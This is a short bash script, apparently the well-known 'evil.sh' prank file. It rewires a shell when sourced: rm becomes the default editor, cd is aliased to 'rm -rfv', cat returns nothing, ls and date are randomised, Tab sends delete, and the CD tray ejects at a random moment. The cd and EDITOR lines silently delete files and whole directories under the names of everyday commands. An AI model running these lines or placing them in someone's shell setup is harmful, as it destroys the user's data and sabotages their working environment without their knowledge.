#!/usr/bin/env bash
# evil.sh — http://mths.be/evil.sh

# Set `rm` as the default editor
export EDITOR=/bin/rm

# Make Tab send the delete key
tset -Qe $'\t'

# Randomly make the shell exit whenever a command has a non-zero exit status
((RANDOM % 10)) || set -o errexit

# Let `cat` swallow every input and never return anything
alias cat=true

# Use a random sort option whenever `ls` is invoked
function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }

# Delete directories instead of entering them
alias cd='rm -rfv'

# alias date to generate random dates
alias date='date -d "now + $RANDOM days"'

# eject cd-tray at random time.
sleep $[ ( $RANDOM % 10 )  + 1 ]s && [[ uname=="Darwin" ]] && drutil eject || eject -T &
